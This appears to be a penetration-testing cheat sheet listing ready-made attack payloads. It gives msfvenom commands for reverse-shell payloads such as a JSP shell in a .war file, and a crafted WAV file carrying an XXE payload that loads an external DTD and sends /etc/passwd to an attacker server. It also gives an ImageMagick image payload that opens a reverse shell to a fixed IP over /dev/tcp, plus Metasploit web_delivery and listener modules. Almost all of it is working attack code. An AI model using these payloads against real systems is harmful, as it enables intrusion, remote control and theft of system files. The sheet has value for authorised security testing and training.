# Payloads

## Summary
- [Msfvenom](#msfvenom)
  - [Basic commands](#basic-commands)
  - [List all payloads](#list-all-payloads)
  - [Payload for Java code base (.war) file](#payload-for-java-code-base-war-file)
- [Payload for Wav file](#payload-for-wav-file)
- [Payload for Png and Jpg](#payload-for-png-and-jpg)
- [Msconsole](#msfconsole)
  - [Craft a shell script](#craft-a-shell-script)
  - [Setup a listener](#setup-a-listener)

## Msfvenom
### Basic commands
- `msfvenom -p [payloads] LHOST=[ip] LPORT=[port] -f [extension] -o [payload name]`

### List all payloads
- `msfvenom --list payloads`

### Payload for Java code base (.war file)
- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] -f [file type] -o [output]`


## Payload for Wav file
```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
nano NAMEEVIL.dtd
     ::<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/ passwd">
     ::<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
php -S 0.0.0.0:PORT
<?php echo zlib_decode(base64_decode('base64here')); ?> --> to decode the encoded text
```

## Payload for Png or Jpg
```
push graphic-context
    encoding UTF-8
    viewbox 0 0 1 1
    affine 1 0 0 1 0 0
    push graphic-context
    image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/10.4.64.135/80 0<&1 2>&1'
    pop graphic-context
    pop graphic-context
```
***start a listener***

## Msfconsole
### Craft a shell script
- `use exploit/multi/script/web_delivery`

### Setup a listener
- `use exploit/multi/handler`
